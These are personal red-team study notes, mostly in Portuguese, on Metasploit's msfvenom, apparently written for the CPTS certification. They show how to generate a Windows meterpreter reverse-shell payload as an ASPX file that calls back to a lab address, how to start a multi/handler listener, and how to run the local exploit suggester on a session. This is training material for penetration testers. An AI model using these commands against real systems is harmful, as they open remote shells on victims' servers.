> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/using-metasploit-framework/introduction-to-msfvenom.md).

# Introduction to MSFVenom

`MSFVenom`é o sucessor de `MSFPayload`e `MSFEncode`, dois scripts independentes que costumavam trabalhar em conjunto `msfconsole`para fornecer aos usuários cargas úteis altamente personalizáveis ​​e difíceis de detectar para seus exploits.

#### **Criando Nossas Cargas Úteis**

* **Gerando carga útil**

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

* **MSF - Configurando Multi/Handler**

```sh
msfconsole -q 
msf6 exploit(multi/handler) > use multi/handler
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
```

* **MSF - Searching for Local Exploit Suggester**

```sh
msf6 > search local exploit suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 2
msf6 post(multi/recon/local_exploit_suggester) > run
```
